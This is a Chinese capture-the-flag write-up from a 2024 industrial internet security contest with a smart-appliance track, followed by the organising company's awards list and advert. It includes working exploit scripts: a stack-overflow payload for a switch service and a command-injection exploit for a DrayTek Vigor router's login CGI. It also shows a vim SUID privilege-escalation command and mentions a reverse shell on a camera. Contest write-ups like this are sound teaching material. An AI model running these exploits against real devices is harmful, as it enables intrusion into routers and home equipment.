# 2024中国工业互联网安全大赛智能家电行业赛道选拔赛决赛WriteUp

> 原文: https://www.ctfiot.com/197061.html
> ID: 197061

青岛智能家电比赛由国家高端智能化家用电器创新中心、深圳信息通信研究院（中国信息通信研究院南方分院）、青岛未来网络创新技术有限公司主办，是家电行业首届国家级安全赛事，获得了国家工信部、山东省工信厅、山东省通信管理局、青岛市通信管理局、青岛市工信局、青岛市网信办等多级政府部门的鼎力支持。

本次比赛准备的部分IoT设备

物联网智能家居场景实战题

物联网

sonic_swtich_交换机

对固件进行审计，并且对远端进行端口扫描。

发现6888端口上开放了一个服务，存在栈溢出：

from pwn import *context.log_level='debug'sh=process('nc 192.3.2.19 6888',shell=True)text_addr=0x55555540090f-0x90f+0x87Apayload='a'*(32+8)+p64(text_addr)sh.recvuntil(':')sh.send(payload)sh.interactive()

vigor_router_路由器

import requestshost='http://192.3.2.238'def run_cmd(cmd):    try:        headers = {            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)Gecko/20100101 Firefox/75.0"            }        url = host + "/cgi-bin/mainfunction.cgi"        data = "action=login&keyPath=%27%0A%2fbin%2f" + cmd + "%0A%27&loginUser=a&loginPwd=a"        res = requests.post(url=url, data=data, timeout=(10, 15),headers=headers)        if res.status_code == 200:            return res.text        else:            print('error')            return 1        except Exception as e:            return ""data=run_cmd('cat${IFS}/flag.txt')print(data)

mqtt_broker_物联网broker

dlink_ipcamera_摄像头

cgi可用接口表：

其中可见，AdminID 处存在命令注入。没有回显，可以反弹shell或者往可访问页面里写Flag.

智能家居

(区域A) 窗帘与洗衣机

(区域D) 电视与机顶盒

预期解法

非预期解法

scrcpy 直接远控：

(区域F) 门铃与智能空调

空调部分

直接使用 flipper zero 的红外遥控学习功能复制原遥控器红外信号即可。

门铃部分

根据门铃的工作方式和外观判断，该门铃是使用 315/433Mhz 信号进行通信。

先使用 harkrf 简单的看下遥控器的波段范围，大致是在 433Mhz；

再使用 flipper zero 嗅探 433Mhz并且重放即可控制门铃。

智能制造

业务系统

shiro 反序列化工具一把梭：

报表系统

系统为积木报表，queryFieldBySql 接口存在命令执行：

但是低权限，需要提权，也需要一个交互式 shell 环境，而且这道题网络设置了不能出网。

第一种方法是打内存马，可以参考链接文章，现场因为不让上外网，JAVA也不熟，不好构造。

第二种方法是为了解题，直接在命令执行的环境里想办法去提权拿Flag，当时盲猜了是SUID提权，但find命令会直接返回空，就直接尝试了几个常见的，没成就没继续了，赛后看群里有师傅说了是 vim SUID提权：

vim -c :wq/tmp/flag /root/flag

十分可惜。

智能智造上位机

CTF夺旗竞赛

BLE 协议分析

流量包尾部有一个压缩包：

根据相关提示，密码为 link_key。

在流量包中寻找:

解压获得 flag。

UDP协议分析

udp 流4中存在一段明文：

unhex 后获得 flag。

RSA基础

from gmpy2 import *g,s,t = gcdext(e1,e2)m = pow(c1,s,n1)*pow(c2,t,n1)%n1from Crypto.Util.number import *print(long_to_bytes(m))# cHZrcXs3MnAwMWwwNTlvMzE3N285MWszN2sxNGw1bW5sbTczM30=

异常工控流量

modbus 中写有图片：

按照线圈地址拼接：

tshark -r ics.pcapng -T fields -e modbus.regval_uint16 > modbus.txt

f = open("modbus.txt","r").readlines()
res = []for i in f:    if(len(i) > 1):        res += i[:-1].split(",")
count = 0for i in res:    if(i == "35152"):        count += 1        try:            fw.close()        except:            None        fw = open("flag{}.png".format(count),"wb")        fw.write(bytes.fromhex(hex(int(i))[2:].rjust(4,"0")))    else:        fw.write(bytes.fromhex(hex(int(i))[2:].rjust(4,"0")))

IEC104规约

iec60870_asdu.ioa 里一个一个地写了 flag 的片段，提出来就是 flag。

tshark -r 1.pcapng -T fields -e iec60870_asdu.ioa > iec.txt

简单逆向

安卓逆向工程

前部分 decode 后得到的结果是 fake flag。

再仔细看看其他内容：

md5 + flag +str，故那个base64解码后中间部分就是 flag。

md5 32字节，str 19字节，掐头去尾获得 flag。

恶意流量分析

流87找到上传 php，对应变量名 ant, 找到后续流 ant 的传参：

分析命令执行应该对应的是 source。查看每个流 source 的值，在流96的 source 找到：

恶意固件分析

使用 binwalk 解包固件后，发现一个大小不合理的 libc.so:

对其进行逆向分析

test='q{vplACMZY|F&Y}MUYA|nA}B&tBB&@yB%YBo&j'a=[0]*0x25for i in range(0x26):    for j in range(255):        if ord(test[i]) == j ^0x17:            print(chr(j),end='')            break

应用逻辑异常

逻辑在JS里，直接调用解密部分：

公司荣誉

2021年 CVVD首届车联网漏洞挖掘赛二等奖

2021年 第二届“祥云杯”网络安全大赛总决赛三等奖

2021年 浙江省信息通信行业网络安全技能竞赛个人竞赛二等奖、团体竞赛一等奖

2021年 智能网联汽车安全测评技能大赛智能网联汽车破解悬赏赛三等奖

2022年 首届中国智能网联汽车数据与隐私安全技能大赛最佳数据安全漏洞挖掘奖

2022年 第六届河北师范大学信息安全挑战赛暨HECTF2022优秀技术支持单位

2022年 浙江省信息通信行业网络安全技能竞赛个人竞赛二等奖、团体竞赛一等奖

2022年 中国工业互联网安全大赛（浙江省选拔赛）团体竞赛三等奖

2022年 第二届“之江杯”工业互联网广义功能安全国际精英挑战赛冠军（特等奖）、广义功能安全奖

2023年 “凌武杯”杭州未来科技城网络与信息安全管理员职业技能竞赛优秀承办单位

2023年 浙江省信息通信行业职业技能竞赛（网络与信息安全管理员）个人赛冠军、团队赛二等奖

2023年 浙江省工业互联网安全竞赛三等奖

2023年 “梦想·中移杯”杭州未来科技城软件系统测试职业技能大赛二等奖

2023年 软件供应链安全竞赛优秀支撑单位

2023年 第七届河北师范大学信息安全挑战赛暨HECTF2023优秀技术支持单位

2023年 第四届电信和互联网行业职业技能竞赛个人赛二等奖

2023年 全国网络与信息安全管理员职工职业技能竞赛一等奖

2023年 “补天杯”破解大赛亚军

2023年 首届“强基杯”数据安全技能竞赛数据安全实战赛道全国二等奖

2023年 首届“强基杯”数据安全技能竞赛复赛华东赛区数据安全实战赛道团队三等奖

2023年 全国行业职业技能竞赛–第二届全国数据安全职业技能竞赛总决赛一等奖

2024年 杭州电子科技大学网络攻防大赛优秀技术支持单位

2024年 第七届西湖论剑·中国杭州网络安全技能大赛创新挑战赛优秀作品奖·B等

2024年 第七届工业信息安全技能大赛全国总决赛三等奖

2024年 GEEKCON “对抗研判 AVSS 挑战赛” 决赛第二名 

2024年 “矩阵杯”网络安全大赛国产软硬件检测赛二等奖、最佳演示奖，人工智能挑战赛三等奖

杭州凌武科技有限公司是一家专注于网络安全的新兴企业，自主研发了竞赛平台、实训平台、文件追踪平台、攻防演练平台、钓鱼演练平台等多款安全产品，提供专业的渗透测试、漏洞挖掘、安全培训、竞赛支撑等服务，对车联网安全、物联网安全、工控安全等新方向有深入的研究，致力于成为客户信赖的安全伙伴。如果您有以上相关业务的需求，欢迎随时联系我们。

关注我们

联系我们


```
from pwn import *context.log_level='debug'sh=process('nc 192.3.2.19 6888',shell=True)text_addr=0x55555540090f-0x90f+0x87Apayload='a'*(32+8)+p64(text_addr)sh.recvuntil(':')sh.send(payload)sh.interactive()
```



```
import requestshost='http://192.3.2.238'def run_cmd(cmd):    try:        headers = {            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)Gecko/20100101 Firefox/75.0"            }        url = host + "/cgi-bin/mainfunction.cgi"        data = "action=login&keyPath=%27%0A%2fbin%2f" + cmd + "%0A%27&loginUser=a&loginPwd=a"        res = requests.post(url=url, data=data, timeout=(10, 15),headers=headers)        if res.status_code == 200:            return res.text        else:            print('error')            return 1        except Exception as e:            return ""data=run_cmd('cat${IFS}/flag.txt')print(data)
```



```
vim -c :wq/tmp/flag /root/flag
```



```
from gmpy2 import *g,s,t = gcdext(e1,e2)m = pow(c1,s,n1)*pow(c2,t,n1)%n1from Crypto.Util.number import *print(long_to_bytes(m))# cHZrcXs3MnAwMWwwNTlvMzE3N285MWszN2sxNGw1bW5sbTczM30=
```



```
tshark -r ics.pcapng -T fields -e modbus.regval_uint16 > modbus.txt
```



```
f = open("modbus.txt","r").readlines()
res = []for i in f:    if(len(i) > 1):        res += i[:-1].split(",")
count = 0for i in res:    if(i == "35152"):        count += 1        try:            fw.close()        except:            None        fw = open("flag{}.png".format(count),"wb")        fw.write(bytes.fromhex(hex(int(i))[2:].rjust(4,"0")))    else:        fw.write(bytes.fromhex(hex(int(i))[2:].rjust(4,"0")))
```



```
tshark -r 1.pcapng -T fields -e iec60870_asdu.ioa > iec.txt
```



```
test='q{vplACMZY|F&Y}MUYA|nA}B&tBB&@yB%YBo&j'a=[0]*0x25for i in range(0x26):    for j in range(255):        if ord(test[i]) == j ^0x17:            print(chr(j),end='')            break
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/9-1722557181.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/4-1722557184.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/6-1722557184.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/8-1722557185.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/2-1722557186.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/3-1722557187.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/10-1722557187.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/5-1722557188.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/3-1722557189.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/7-1722557190.png)